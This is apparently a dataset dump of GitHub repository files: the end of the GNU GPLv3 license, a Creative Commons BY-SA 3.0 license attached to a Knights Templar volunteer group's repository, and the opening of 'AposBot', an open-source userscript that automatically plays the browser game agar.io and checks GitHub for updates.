or non-consumer uses, unless such uses represent the only significant mode of use of the product.    ""Installation Information"" for a User Product means any methods, procedures, authorization keys, or other information required to install and execute modified versions of a covered work in that User Product from a modified version of its Corresponding Source.  The information must suffice to ensure that the continued functioning of the modified object code is in no case prevented or interfered with solely because modification has been made.    If you convey an object code work under this section in, or with, or specifically for use in, a User Product, and the conveying occurs as part of a transaction in which the right of possession and use of the User Product is transferred to the recipient in perpetuity or for a fixed term (regardless of how the transaction is characterized), the Corresponding Source conveyed under this section must be accompanied by the Installation Information.  But this requirement does not apply if neither you nor any third party retains the ability to install modified object code on the User Product (for example, the work has been installed in ROM).    The requirement to provide Installation Information does not include a requirement to continue to provide support service, warranty, or updates for a work that has been modified or installed by the recipient, or for the User Product in which it has been modified or installed.  Access to a network may be denied when the modification itself materially and adversely affects the operation of the network or violates the rules and protocols for communication across the network.    Corresponding Source conveyed, and Installation Information provided, in accord with this section must be in a format that is publicly documented (and with an implementation available to the public in source code form), and must require no special password or key for unpacking, reading or copying.    7. Additional Terms.    ""Additional permissions"" are terms that supplement the terms of this License by making exceptions from one or more of its conditions. Additional permissions that are applicable to the entire Program shall be treated as though they were included in this License, to the extent that they are valid under applicable law.  If additional permissions apply only to part of the Program, that part may be used separately under those permissions, but the entire Program remains governed by this License without regard to the additional permissions.    When you convey a copy of a covered work, you may at your option remove any additional permissions from that copy, or from any part of it.  (Additional permissions may be written to require their own removal in certain cases when you modify the work.)  You may place additional permissions on material, added by you to a covered work, for which you have or can give appropriate copyright permission.    Notwithstanding any other provision of this License, for material you add to a covered work, you may (if authorized by the copyright holders of that material) supplement the terms of this License with terms:      a) Disclaiming warranty or limiting liability differently from the     terms of sections 15 and 16 of this License; or      b) Requiring preservation of specified reasonable legal notices or     author attributions in that material or in the Appropriate Legal     Notices displayed by works containing it; or      c) Prohibiting misrepresentation of the origin of that material, or     requiring that modified versions of such material be marked in     reasonable ways as different from the original version; or      d) Limiting the use for publicity purposes of names of licensors or     authors of the material; or      e) Declining to grant rights under trademark law for use of some     trade names, trademarks, or service marks; or      f) Requiring indemnification of licensors and authors of that     material by anyone who conveys the material (or modified versions of     it) with contractual assumptions of liability to the recipient, for     any liability that these contractual assumptions directly impose on     those licensors and authors.    All other non-permissive additional terms are considered ""further restrictions"" within the meaning of section 10.  If the Program as you received it, or any part of it, contains a notice stating that it is governed by this License along with a term that is a further restriction, you may remove that term.  If a license document contains a further restriction but permits relicensing or conveying under this License, you may add to a covered work material governed by the terms of that license document, provided that the further restriction does not survive such relicensing or conveying.    If you add terms to a covered work in accord with this section, you must place, in the relevant source files, a statement of the additional terms that apply to those files, or a notice indicating where to find the applicable terms.    Additional terms, permissive or non-permissive, may be stated in the form of a separately written license, or stated as exceptions; the above requirements apply either way.    8. Termination.    You may not propagate or modify a covered work except as expressly provided under this License.  Any attempt otherwise to propagate or modify it is void, and will automatically terminate your rights under this License (including any patent licenses granted under the third paragraph of section 11).    However, if you cease all violation of this License, then your license from a particular copyright holder is reinstated (a) provisionally, unless and until the copyright holder explicitly and finally terminates your license, and (b) permanently, if the copyright holder fails to notify you of the violation by some reasonable means prior to 60 days after the cessation.    Moreover, your license from a particular copyright holder is reinstated permanently if the copyright holder notifies you of the violation by some reasonable means, this is the first time you have received notice of violation of this License (for any work) from that copyright holder, and you cure the violation prior to 30 days after your receipt of the notice.    Termination of your rights under this section does not terminate the licenses of parties who have received copies or rights from you under this License.  If your rights have been terminated and not permanently reinstated, you do not qualify to receive new licenses for the same material under section 10.    9. Acceptance Not Required for Having Copies.    You are not required to accept this License in order to receive or run a copy of the Program.  Ancillary propagation of a covered work occurring solely as a consequence of using peer-to-peer transmission to receive a copy likewise does not require acceptance.  However, nothing other than this License grants you permission to propagate or modify any covered work.  These actions infringe copyright if you do not accept this License.  Therefore, by modifying or propagating a covered work, you indicate your acceptance of this License to do so.    10. Automatic Licensing of Downstream Recipients.    Each time you convey a covered work, the recipient automatically receives a license from the original licensors, to run, modify and propagate that work, subject to this License.  You are not responsible for enforcing compliance by third parties with this License.    An ""entity transaction"" is a transaction transferring control of an organization, or substantially all assets of one, or subdividing an organization, or merging organizations.  If propagation of a covered work results from an entity transaction, each party to that transaction who receives a copy of the work also receives whatever licenses to the work the party\'s predecessor in interest had or could give under the previous paragraph, plus a right to possession of the Corresponding Source of the work from the predecessor in interest, if the predecessor has it or can get it with reasonable efforts.    You may not impose any further restrictions on the exercise of the rights granted or affirmed under this License.  For example, you may not impose a license fee, royalty, or other charge for exercise of rights granted under this License, and you may not initiate litigation (including a cross-claim or counterclaim in a lawsuit) alleging that any patent claim is infringed by making, using, selling, offering for sale, or importing the Program or any portion of it.    11. Patents.    A ""contributor"" is a copyright holder who authorizes use under this License of the Program or a work on which the Program is based.  The work thus licensed is called the contributor\'s ""contributor version"".    A contributor\'s ""essential patent claims"" are all patent claims owned or controlled by the contributor, whether already acquired or hereafter acquired, that would be infringed by some manner, permitted by this License, of making, using, or selling its contributor version, but do not include claims that would be infringed only as a consequence of further modification of the contributor version.  For purposes of this definition, ""control"" includes the right to grant patent sublicenses in a manner consistent with the requirements of this License.    Each contributor grants you a non-exclusive, worldwide, royalty-free patent license under the contributor\'s essential patent claims, to make, use, sell, offer for sale, import and otherwise run, modify and propagate the contents of its contributor version.    In the following three paragraphs, a ""patent license"" is any express agreement or commitment, however denominated, not to enforce a patent (such as an express permission to practice a patent or covenant not to sue for patent infringement).  To ""grant"" such a patent license to a party means to make such an agreement or commitment not to enforce a patent against the party.    If you convey a covered work, knowingly relying on a patent license, and the Corresponding Source of the work is not available for anyone to copy, free of charge and under the terms of this License, through a publicly available network server or other readily accessible means, then you must either (1) cause the Corresponding Source to be so available, or (2) arrange to deprive yourself of the benefit of the patent license for this particular work, or (3) arrange, in a manner consistent with the requirements of this License, to extend the patent license to downstream recipients.  ""Knowingly relying"" means you have actual knowledge that, but for the patent license, your conveying the covered work in a country, or your recipient\'s use of the covered work in a country, would infringe one or more identifiable patents in that country that you have reason to believe are valid.    If, pursuant to or in connection with a single transaction or arrangement, you convey, or propagate by procuring conveyance of, a covered work, and grant a patent license to some of the parties receiving the covered work authorizing them to use, propagate, modify or convey a specific copy of the covered work, then the patent license you grant is automatically extended to all recipients of the covered work and works based on it.    A patent license is ""discriminatory"" if it does not include within the scope of its coverage, prohibits the exercise of, or is conditioned on the non-exercise of one or more of the rights that are specifically granted under this License.  You may not convey a covered work if you are a party to an arrangement with a third party that is in the business of distributing software, under which you make payment to the third party based on the extent of your activity of conveying the work, and under which the third party grants, to any of the parties who would receive the covered work from you, a discriminatory patent license (a) in connection with copies of the covered work conveyed by you (or copies made from those copies), or (b) primarily for and in connection with specific products or compilations that contain the covered work, unless you entered into that arrangement, or that patent license was granted, prior to 28 March 2007.    Nothing in this License shall be construed as excluding or limiting any implied license or other defenses to infringement that may otherwise be available to you under applicable patent law.    12. No Surrender of Others\' Freedom.    If conditions are imposed on you (whether by court order, agreement or otherwise) that contradict the conditions of this License, they do not excuse you from the conditions of this License.  If you cannot convey a covered work so as to satisfy simultaneously your obligations under this License and any other pertinent obligations, then as a consequence you may not convey it at all.  For example, if you agree to terms that obligate you to collect a royalty for further conveying from those to whom you convey the Program, the only way you could satisfy both those terms and this License would be to refrain entirely from conveying the Program.    13. Use with the GNU Affero General Public License.    Notwithstanding any other provision of this License, you have permission to link or combine any covered work with a work licensed under version 3 of the GNU Affero General Public License into a single combined work, and to convey the resulting work.  The terms of this License will continue to apply to the part which is the covered work, but the special requirements of the GNU Affero General Public License, section 13, concerning interaction through a network will apply to the combination as such.    14. Revised Versions of this License.    The Free Software Foundation may publish revised and/or new versions of the GNU General Public License from time to time.  Such new versions will be similar in spirit to the present version, but may differ in detail to address new problems or concerns.    Each version is given a distinguishing version number.  If the Program specifies that a certain numbered version of the GNU General Public License ""or any later version"" applies to it, you have the option of following the terms and conditions either of that numbered version or of any later version published by the Free Software Foundation.  If the Program does not specify a version number of the GNU General Public License, you may choose any version ever published by the Free Software Foundation.    If the Program specifies that a proxy can decide which future versions of the GNU General Public License can be used, that proxy\'s public statement of acceptance of a version permanently authorizes you to choose that version for the Program.    Later license versions may give you additional or different permissions.  However, no additional obligations are imposed on any author or copyright holder as a result of your choosing to follow a later version.    15. Disclaimer of Warranty.    THERE IS NO WARRANTY FOR THE PROGRAM, TO THE EXTENT PERMITTED BY APPLICABLE LAW.  EXCEPT WHEN OTHERWISE STATED IN WRITING THE COPYRIGHT HOLDERS AND/OR OTHER PARTIES PROVIDE THE PROGRAM ""AS IS"" WITHOUT WARRANTY OF ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE.  THE ENTIRE RISK AS TO THE QUALITY AND PERFORMANCE OF THE PROGRAM IS WITH YOU.  SHOULD THE PROGRAM PROVE DEFECTIVE, YOU ASSUME THE COST OF ALL NECESSARY SERVICING, REPAIR OR CORRECTION.    16. Limitation of Liability.    IN NO EVENT UNLESS REQUIRED BY APPLICABLE LAW OR AGREED TO IN WRITING WILL ANY COPYRIGHT HOLDER, OR ANY OTHER PARTY WHO MODIFIES AND/OR CONVEYS THE PROGRAM AS PERMITTED ABOVE, BE LIABLE TO YOU FOR DAMAGES, INCLUDING ANY GENERAL, SPECIAL, INCIDENTAL OR CONSEQUENTIAL DAMAGES ARISING OUT OF THE USE OR INABILITY TO USE THE PROGRAM (INCLUDING BUT NOT LIMITED TO LOSS OF DATA OR DATA BEING RENDERED INACCURATE OR LOSSES SUSTAINED BY YOU OR THIRD PARTIES OR A FAILURE OF THE PROGRAM TO OPERATE WITH ANY OTHER PROGRAMS), EVEN IF SUCH HOLDER OR OTHER PARTY HAS BEEN ADVISED OF THE POSSIBILITY OF SUCH DAMAGES.    17. Interpretation of Sections 15 and 16.    If the disclaimer of warranty and limitation of liability provided above cannot be given local legal effect according to their terms, reviewing courts shall apply local law that most closely approximates an absolute waiver of all civil liability in connection with the Program, unless a warranty or assumption of liability accompanies a copy of the Program in return for a fee.                       END OF TERMS AND CONDITIONS              How to Apply These Terms to Your New Programs    If you develop a new program, and you want it to be of the greatest possible use to the public, the best way to achieve this is to make it free software which everyone can redistribute and change under these terms.    To do so, attach the following notices to the program.  It is safest to attach them to the start of each source file to most effectively state the exclusion of warranty; and each file should have at least the ""copyright"" line and a pointer to where the full notice is found.      {one line to give the program\'s name and a brief idea of what it does.}     Copyright (C) {year}  {name of author}      This program is free software: you can redistribute it and/or modify     it under the terms of the GNU General Public License as published by     the Free Software Foundation, either version 3 of the License, or     (at your option) any later version.      This program is distributed in the hope that it will be useful,     but WITHOUT ANY WARRANTY; without even the implied warranty of     MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the     GNU General Public License for more details.      You should have received a copy of the GNU General Public License     along with this program.  If not, see <http://www.gnu.org/licenses/>.  Also add information on how to contact you by electronic and paper mail.    If the program does terminal interaction, make it output a short notice like this when it starts in an interactive mode:      {project}  Copyright (C) {year}  {fullname}     This program comes with ABSOLUTELY NO WARRANTY; for details type `show w\'.     This is free software, and you are welcome to redistribute it     under certain conditions; type `show c\' for details.  The hypothetical commands `show w\' and `show c\' should show the appropriate parts of the General Public License.  Of course, your program\'s commands might be different; for a GUI interface, you would use an ""about box"".    You should also get your employer (if you work as a programmer) or school, if any, to sign a ""copyright disclaimer"" for the program, if necessary. For more information on this, and how to apply and follow the GNU GPL, see <http://www.gnu.org/licenses/>.    The GNU General Public License does not permit incorporating your program into proprietary programs.  If your program is a subroutine library, you may consider it more useful to permit linking proprietary applications with the library.  If this is what you want to do, use the GNU Lesser General Public License instead of this License.  But first, please read <http://www.gnu.org/philosophy/why-not-lgpl.html>.",,2
0,https://github.com/honeybeeluv07/Deus-Vult-Ministries-Org.git,"The US Commandery Knights Templar Holy Order\'s expectations as participants in our local communities as a team of rescue & response units within the regions across America. The USC KT are formed together as retired Veterans, Military Servicemen, Law Enforcement Officials, Patriots, Freedom Lovers of Liberty, Guardians of our Great Nation, Ministers & Nuns, hardworking individuals formed together in unity under The Word of God as our Virtues of Conduct through our Love, Honor, Dedication of Servitude to our LORD & Savior Jesus Christ forever and ever.  Under such Rights & Privileges is our USC KT Memberships understanding of our Terms & Privileges -This work is licensed under Creative Commons\' Attribution-ShareAlike 3.0 United States (CC BY-SA 3.0) - http://creativecommons.org/licenses/by-sa/3.0/us/  If you use these icons, please add a link to Iconic (http://somerandomdude.com/work/iconic/) somewhere on your site or in your app.    LEGAL MUMBO-JUMBO  You are free:  to Share ‚Äî to copy, distribute and transmit the work to Remix ‚Äî to adapt the work to make commercial use of the work  Under the following conditions:  Attribution ‚Äî You must attribute the work in the manner specified by the author or licensor (but not in any way that suggests that they endorse you or your use of the work). Share Alike ‚Äî If you alter, transform, or build upon this work, you may distribute the resulting work only under the same or similar license to this one. With the understanding that:  Waiver ‚Äî Any of the above conditions can be waived if you get permission from the copyright holder. Public Domain ‚Äî Where the work or any of its elements is in the public domain under applicable law, that status is in no way affected by the license. Other Rights ‚Äî In no way are any of the following rights affected by the license: Your fair dealing or fair use rights, or other applicable copyright exceptions and limitations; Apart from the remix rights granted under this license, the author\'s moral rights; Rights other persons may have either in the work itself or in how the work is used, such as publicity or privacy rights. Notice ‚Äî For any reuse or distribution, you must make clear to others the license terms of this work. The best way to do this is with a link to this web page.   Full License   THE WORK (AS DEFINED BELOW) IS PROVIDED UNDER THE TERMS OF THIS CREATIVE COMMONS PUBLIC LICENSE (""CCPL"" OR ""LICENSE""). THE WORK IS PROTECTED BY COPYRIGHT AND/OR OTHER APPLICABLE LAW. ANY USE OF THE WORK OTHER THAN AS AUTHORIZED UNDER THIS LICENSE OR COPYRIGHT LAW IS PROHIBITED.  BY EXERCISING ANY RIGHTS TO THE WORK PROVIDED HERE, YOU ACCEPT AND AGREE TO BE BOUND BY THE TERMS OF THIS LICENSE. TO THE EXTENT THIS LICENSE MAY BE CONSIDERED TO BE A CONTRACT, THE LICENSOR GRANTS YOU THE RIGHTS CONTAINED HERE IN CONSIDERATION OF YOUR ACCEPTANCE OF SUCH TERMS AND CONDITIONS.  1. Definitions  ""Collective Work"" means a work, such as a periodical issue, anthology or encyclopedia, in which the Work in its entirety in unmodified form, along with one or more other contributions, constituting separate and independent works in themselves, are assembled into a collective whole. A work that constitutes a Collective Work will not be considered a Derivative Work (as defined below) for the purposes of this License. ""Creative Commons Compatible License"" means a license that is listed at http://creativecommons.org/compatiblelicenses that has been approved by Creative Commons as being essentially equivalent to this License, including, at a minimum, because that license: (i) contains terms that have the same purpose, meaning and effect as the License Elements of this License; and, (ii) explicitly permits the relicensing of derivatives of works made available under that license under this License or either a Creative Commons unported license or a Creative Commons jurisdiction license with the same License Elements as this License. ""Derivative Work"" means a work based upon the Work or upon the Work and other pre-existing works, such as a translation, musical arrangement, dramatization, fictionalization, motion picture version, sound recording, art reproduction, abridgment, condensation, or any other form in which the Work may be recast, transformed, or adapted, except that a work that constitutes a Collective Work will not be considered a Derivative Work for the purpose of this License. For the avoidance of doubt, where the Work is a musical composition or sound recording, the synchronization of the Work in timed-relation with a moving image (""synching"") will be considered a Derivative Work for the purpose of this License. ""License Elements"" means the following high-level license attributes as selected by Licensor and indicated in the title of this License: Attribution, ShareAlike. ""Licensor"" means the individual, individuals, entity or entities that offers the Work under the terms of this License. ""Original Author"" means the individual, individuals, entity or entities who created the Work. ""Work"" means the copyrightable work of authorship offered under the terms of this License. ""You"" means an individual or entity exercising rights under this License who has not previously violated the terms of this License with respect to the Work, or who has received express permission from the Licensor to exercise rights under this License despite a previous violation. 2. Fair Use Rights. Nothing in this license is intended to reduce, limit, or restrict any rights arising from fair use, first sale or other limitations on the exclusive rights of the copyright owner under copyright law or other applicable laws.  3. License Grant. Subject to the terms and conditions of this License, Licensor hereby grants You a worldwide, royalty-free, non-exclusive, perpetual (for the duration of the applicable copyright) license to exercise the rights in the Work as stated below:  to reproduce the Work, to incorporate the Work into one or more Collective Works, and to reproduce the Work as incorporated in the Collective Works; to create and reproduce Derivative Works provided that any such Derivative Work, including any translation in any medium, takes reasonable steps to clearly label, demarcate or otherwise identify that changes were made to the original Work. For example, a translation could be marked ""The original work was translated from English to Spanish,"" or a modification could indicate ""The original work has been modified.""; to distribute copies or phonorecords of, display publicly, perform publicly, and perform publicly by means of a digital audio transmission the Work including as incorporated in Collective Works; to distribute copies or phonorecords of, display publicly, perform publicly, and perform publicly by means of a digital audio transmission Derivative Works. For the avoidance of doubt, where the Work is a musical composition:  Performance Royalties Under Blanket Licenses. Licensor waives the exclusive right to collect, whether individually or, in the event that Licensor is a member of a performance rights society (e.g. ASCAP, BMI, SESAC), via that society, royalties for the public performance or public digital performance (e.g. webcast) of the Work. Mechanical Rights and Statutory Royalties. Licensor waives the exclusive right to collect, whether individually or via a music rights agency or designated agent (e.g. Harry Fox Agency), royalties for any phonorecord You create from the Work (""cover version"") and distribute, subject to the compulsory license created by 17 USC Section 115 of the US Copyright Act (or the equivalent in other jurisdictions). Webcasting Rights and Statutory Royalties. For the avoidance of doubt, where the Work is a sound recording, Licensor waives the exclusive right to collect, whether individually or via a performance-rights society (e.g. SoundExchange), royalties for the public digital performance (e.g. webcast) of the Work, subject to the compulsory license created by 17 USC Section 114 of the US Copyright Act (or the equivalent in other jurisdictions). The above rights may be exercised in all media and formats whether now known or hereafter devised. The above rights include the right to make such modifications as are technically necessary to exercise the rights in other media and formats. All rights not expressly granted by Licensor are hereby reserved.  4. Restrictions. The license granted in Section 3 above is expressly made subject to and limited by the following restrictions:  You may distribute, publicly display, publicly perform, or publicly digitally perform the Work only under the terms of this License, and You must include a copy of, or the Uniform Resource Identifier for, this License with every copy or phonorecord of the Work You distribute, publicly display, publicly perform, or publicly digitally perform. You may not offer or impose any terms on the Work that restrict the terms of this License or the ability of a recipient of the Work to exercise of the rights granted to that recipient under the terms of the License. You may not sublicense the Work. You must keep intact all notices that refer to this License and to the disclaimer of warranties. When You distribute, publicly display, publicly perform, or publicly digitally perform the Work, You may not impose any technological measures on the Work that restrict the ability of a recipient of the Work from You to exercise of the rights granted to that recipient under the terms of the License. This Section 4(a) applies to the Work as incorporated in a Collective Work, but this does not require the Collective Work apart from the Work itself to be made subject to the terms of this License. If You create a Collective Work, upon notice from any Licensor You must, to the extent practicable, remove from the Collective Work any credit as required by Section 4(c), as requested. If You create a Derivative Work, upon notice from any Licensor You must, to the extent practicable, remove from the Derivative Work any credit as required by Section 4(c), as requested. You may distribute, publicly display, publicly perform, or publicly digitally perform a Derivative Work only under: (i) the terms of this License; (ii) a later version of this License with the same License Elements as this License; (iii) either the Creative Commons (Unported) license or a Creative Commons jurisdiction license (either this or a later license version) that contains the same License Elements as this License (e.g. Attribution-ShareAlike 3.0 (Unported)); (iv) a Creative Commons Compatible License. If you license the Derivative Work under one of the licenses mentioned in (iv), you must comply with the terms of that license. If you license the Derivative Work under the terms of any of the licenses mentioned in (i), (ii) or (iii) (the ""Applicable License""), you must comply with the terms of the Applicable License generally and with the following provisions: (I) You must include a copy of, or the Uniform Resource Identifier for, the Applicable License with every copy or phonorecord of each Derivative Work You distribute, publicly display, publicly perform, or publicly digitally perform; (II) You may not offer or impose any terms on the Derivative Works that restrict the terms of the Applicable License or the ability of a recipient of the Work to exercise the rights granted to that recipient under the terms of the Applicable License; (III) You must keep intact all notices that refer to the Applicable License and to the disclaimer of warranties; and, (IV) when You distribute, publicly display, publicly perform, or publicly digitally perform the Work, You may not impose any technological measures on the Derivative Work that restrict the ability of a recipient of the Derivative Work from You to exercise the rights granted to that recipient under the terms of the Applicable License. This Section 4(b) applies to the Derivative Work as incorporated in a Collective Work, but this does not require the Collective Work apart from the Derivative Work itself to be made subject to the terms of the Applicable License. If You distribute, publicly display, publicly perform, or publicly digitally perform the Work (as defined in Section 1 above) or any Derivative Works (as defined in Section 1 above) or Collective Works (as defined in Section 1 above), You must, unless a request has been made pursuant to Section 4(a), keep intact all copyright notices for the Work and provide, reasonable to the medium or means You are utilizing: (i) the name of the Original Author (or pseudonym, if applicable) if supplied, and/or (ii) if the Original Author and/or Licensor designate another party or parties (e.g. a sponsor institute, publishing entity, journal) for attribution (""Attribution Parties"") in Licensor\'s copyright notice, terms of service or by other reasonable means, the name of such party or parties; the title of the Work if supplied; to the extent reasonably practicable, the Uniform Resource Identifier, if any, that Licensor specifies to be associated with the Work, unless such URI does not refer to the copyright notice or licensing information for the Work; and, consistent with Section 3(b) in the case of a Derivative Work, a credit identifying the use of the Work in the Derivative Work (e.g., ""French translation of the Work by Original Author,"" or ""Screenplay based on original Work by Original Author""). The credit required by this Section 4(c) may be implemented in any reasonable manner; provided, however, that in the case of a Derivative Work or Collective Work, at a minimum such credit will appear, if a credit for all contributing authors of the Derivative Work or Collective Work appears, then as part of these credits and in a manner at least as prominent as the credits for the other contributing authors. For the avoidance of doubt, You may only use the credit required by this Section for the purpose of attribution in the manner set out above and, by exercising Your rights under this License, You may not implicitly or explicitly assert or imply any connection with, sponsorship or endorsement by the Original Author, Licensor and/or Attribution Parties, as appropriate, of You or Your use of the Work, without the separate, express prior written permission of the Original Author, Licensor and/or Attribution Parties. 5. Representations, Warranties and Disclaimer  UNLESS OTHERWISE MUTUALLY AGREED TO BY THE PARTIES IN WRITING, LICENSOR OFFERS THE WORK AS-IS AND ONLY TO THE EXTENT OF ANY RIGHTS HELD IN THE LICENSED WORK BY THE LICENSOR. THE LICENSOR MAKES NO REPRESENTATIONS OR WARRANTIES OF ANY KIND CONCERNING THE WORK, EXPRESS, IMPLIED, STATUTORY OR OTHERWISE, INCLUDING, WITHOUT LIMITATION, WARRANTIES OF TITLE, MARKETABILITY, MERCHANTIBILITY, FITNESS FOR A PARTICULAR PURPOSE, NONINFRINGEMENT, OR THE ABSENCE OF LATENT OR OTHER DEFECTS, ACCURACY, OR THE PRESENCE OF ABSENCE OF ERRORS, WHETHER OR NOT DISCOVERABLE. SOME JURISDICTIONS DO NOT ALLOW THE EXCLUSION OF IMPLIED WARRANTIES, SO SUCH EXCLUSION MAY NOT APPLY TO YOU.  6. Limitation on Liability. EXCEPT TO THE EXTENT REQUIRED BY APPLICABLE LAW, IN NO EVENT WILL LICENSOR BE LIABLE TO YOU ON ANY LEGAL THEORY FOR ANY SPECIAL, INCIDENTAL, CONSEQUENTIAL, PUNITIVE OR EXEMPLARY DAMAGES ARISING OUT OF THIS LICENSE OR THE USE OF THE WORK, EVEN IF LICENSOR HAS BEEN ADVISED OF THE POSSIBILITY OF SUCH DAMAGES.  7. Termination  This License and the rights granted hereunder will terminate automatically upon any breach by You of the terms of this License. Individuals or entities who have received Derivative Works or Collective Works from You under this License, however, will not have their licenses terminated provided such individuals or entities remain in full compliance with those licenses. Sections 1, 2, 5, 6, 7, and 8 will survive any termination of this License. Subject to the above terms and conditions, the license granted here is perpetual (for the duration of the applicable copyright in the Work). Notwithstanding the above, Licensor reserves the right to release the Work under different license terms or to stop distributing the Work at any time; provided, however that any such election will not serve to withdraw this License (or any other license that has been, or is required to be, granted under the terms of this License), and this License will continue in full force and effect unless terminated as stated above. 8. Miscellaneous  Each time You distribute or publicly digitally perform the Work (as defined in Section 1 above) or a Collective Work (as defined in Section 1 above), the Licensor offers to the recipient a license to the Work on the same terms and conditions as the license granted to You under this License. Each time You distribute or publicly digitally perform a Derivative Work, Licensor offers to the recipient a license to the original Work on the same terms and conditions as the license granted to You under this License. If any provision of this License is invalid or unenforceable under applicable law, it shall not affect the validity or enforceability of the remainder of the terms of this License, and without further action by the parties to this agreement, such provision shall be reformed to the minimum extent necessary to make such provision valid and enforceable. No term or provision of this License shall be deemed waived and no breach consented to unless such waiver or consent shall be in writing and signed by the party to be charged with such waiver or consent. This License constitutes the entire agreement between the parties with respect to the Work licensed here. There are no understandings, agreements or representations with respect to the Work not specified here. Licensor shall not be bound by any additional provisions that may appear in any communication from You. This License may not be modified without the mutual written agreement of the Licensor and Yo","usc-kt-order,knights-templar",2
0,https://github.com/githubhack/agar.io-Cheats.git,"/*The MIT License (MIT) Copyright (c) 2015 Apostolique Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the ""Software""), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software. THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.*/  // ==UserScript== // @name        AposBot // @namespace   AposBot // @include     http://agar.io/* // @version     3.568 // @grant       none // @author      http://www.twitch.tv/apostolique // ==/UserScript==  var aposBotVersion = 3.568;  //TODO: Team mode //      Detect when people are merging //      Split to catch smaller targets //      Angle based cluster code //      Better wall code //      In team mode, make allies be obstacles.  Number.prototype.mod = function(n) {     return ((this % n) + n) % n; };  Array.prototype.peek = function() {     return this[this.length - 1]; };  var sha = ""efde0488cc2cc176db48dd23b28a20b90314352b""; function getLatestCommit() {     window.jQuery.ajax({             url: ""https://api.github.com/repos/apostolique/Agar.io-bot/git/refs/heads/master"",             cache: false,             dataType: ""jsonp""         }).done(function(data) {             console.dir(data[""data""]);             console.log(""hmm: "" + data[""data""][""object""][""sha""]);             sha = data[""data""][""object""][""sha""];              function update(prefix, name, url) {                 window.jQuery(document.body).prepend(""<div id=\'"" + prefix + ""Dialog\' style=\'position: absolute; left: 0px; right: 0px; top: 0px; bottom: 0px; z-index: 100; display: none;\'>"");                 window.jQuery(\'#\' + prefix + \'Dialog\').append(""<div id=\'"" + prefix + ""Message\' style=\'width: 350px; background-color: #FFFFFF; margin: 100px auto; border-radius: 15px; padding: 5px 15px 5px 15px;\'>"");                 window.jQuery(\'#\' + prefix + \'Message\').append(""<h2>UPDATE TIME!!!</h2>"");                 window.jQuery(\'#\' + prefix + \'Message\').append(""<p>Grab the update for: <a id=\'"" + prefix + ""Link\' href=\'"" + url + ""\' target=\\""_blank\\"">"" + name + ""</a></p>"");                 window.jQuery(\'#\' + prefix + \'Link\').on(\'click\', function() {                     window.jQuery(""#"" + prefix + ""Dialog"").hide();                     window.jQuery(""#"" + prefix + ""Dialog"").remove();                 });                 window.jQuery(""#"" + prefix + ""Dialog"").show();             }              $.get(\'https://raw.githubusercontent.com/Apostolique/Agar.io-bot/master/bot.user.js?\' + Math.floor((Math.random() * 1000000) + 1), function(data) {                 var latestVersion = data.replace(/(\\r\\n|\\n|\\r)/gm,"""");                 latestVersion = latestVersion.substring(latestVersion.indexOf(""// @version"")+11,latestVersion.indexOf(""// @grant""));                  latestVersion = parseFloat(latestVersion + 0.0000);                 var myVersion = parseFloat(aposBotVersion + 0.0000);                                   if(latestVersion > myVersion)                 {                     update(""aposBot"", ""bot.user.js"", ""https://github.com/Apostolique/Agar.io-bot/blob/"" + sha + ""/bot.user.js/"");                 }                 console.log(\'Current bot.user.js Version: \' + myVersion + "" on Github: "" + latestVersion);             });          }).fail(function() {}); } getLatestCommit();  console.log(""Running Apos Bot!"");  var f = window; var g = window.jQuery;  var aposBot = aposBot || {}; aposBot.name = ""AposBot "" + aposBotVersion; aposBot.mainLoop = function() {}; aposBot.utility = {};  var u = aposBot.utility;  u.splitDistance = 710; console.log(""Apos Bot!"");  if (f.botList == null) {     f.botList = [];     g(\'#locationUnknown\').append(g(\'<select id=""bList"" class=""form-control"" onchange=""setBotIndex($(this).val());"" />\'));     g(\'#locationUnknown\').addClass(\'form-group\'); }  for (var i = f.botList.length - 1; i >= 0; i--) {     if (f.botList[i][0] == ""Human"") {         f.botList.splice(i, 1);     } }   //Given an angle value that was gotten from valueAndleBased(), //returns a new value that scales it appropriately. u.paraAngleValue = function(angleValue, range) {     return (15 / (range[1])) * (angleValue * angleValue) - (range[1] / 6); };  u.valueAngleBased = function(angle, range) {     var leftValue = (angle - range[0]).mod(360);     var rightValue = (u.rangeToAngle(range) - angle).mod(360);      var bestValue = Math.min(leftValue, rightValue);      if (bestValue <= range[1]) {         return u.paraAngleValue(bestValue, range);     }     return -1; };  u.computeDistance = function(x1, y1, x2, y2) {     var xdis = x1 - x2; // <--- FAKE AmS OF COURSE!     var ydis = y1 - y2;     var distance = Math.sqrt(xdis * xdis + ydis * ydis);      return distance; };  u.computeDistanceFromCircleEdge = function(x1, y1, x2, y2, s2) {     var tempD = u.computeDistance(x1, y1, x2, y2);      var offsetX = 0;     var offsetY = 0;      var ratioX = tempD / (x1 - x2);     var ratioY = tempD / (y1 - y2);      offsetX = x1 - (s2 / ratioX);     offsetY = y1 - (s2 / ratioY);      u.drawPoint(offsetX, offsetY, 5, """");      return u.computeDistance(x2, y2, offsetX, offsetY); };  u.compareSize = function(player1, player2, ratio) {     if (player1.size * player1.size * ratio < player2.size * player2.size) {         return true;     }     return false; };  u.canSplit = function(player1, player2) {     return u.compareSize(player1, player2, 2.66) && !u.compareSize(player1, player2, 7); };  u.isItMe = function(player, cell) {     if (u.getMode() == "":teams"") {         var currentColor = player[0].color;         var currentRed = currentColor.substring(1,3);         var currentGreen = currentColor.substring(3,5);         var currentBlue = currentColor.substring(5,7);                  var currentTeam = u.getTeam(currentRed, currentGreen, currentBlue);          var cellColor 